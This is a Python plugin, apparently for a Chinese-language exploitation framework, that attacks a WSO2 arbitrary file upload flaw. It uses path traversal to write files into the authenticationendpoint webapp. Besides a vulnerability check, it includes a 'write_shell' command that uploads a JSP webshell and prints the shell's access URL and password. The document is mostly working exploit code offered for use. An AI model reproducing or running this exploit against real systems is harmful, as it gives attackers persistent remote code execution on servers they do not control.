# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "WSO2 API 远程代码执行漏洞",
        "description": "由于WSO2产品中对用户输入的验证不当，攻击者可以将任意文件上传到服务器的任意位置。通过利用任意文件上传漏洞，可以进一步在服务器上实现远程代码执行",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(4)
        files = {
            f"../../../../repository/deployment/server/webapps/authenticationendpoint/{random_str}": random_str.encode()
        }
        self.request(method='post', path='./fileupload/toolsAny', timeout=15, files=files)
        r = self.request(method='get', path=f'./authenticationendpoint/{random_str}', timeout=15)
        if r.status_code == 200 and random_str in r.text:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='写入一句话马')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    def write_shell(self, url):
        name, password, code, flag = self.build_web_shell('jsp')
        files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/{name}": code.encode()}
        self.request(method='post', url=urllib.parse.urljoin(url, './fileupload/toolsAny'), timeout=15, files=files)
        url = urllib.parse.urljoin(url, f'./authenticationendpoint/{name}')
        r = self.request(method='get', url=url, timeout=15)
        if r.status_code == 200 and flag in r.text:
            self.log.success('一句话马写入成功')
            self.log.success(f'访问地址: {url}')
            self.log.success(f'访问密码: {password}')
        else:
            self.log.failure('一句话马写入失败')
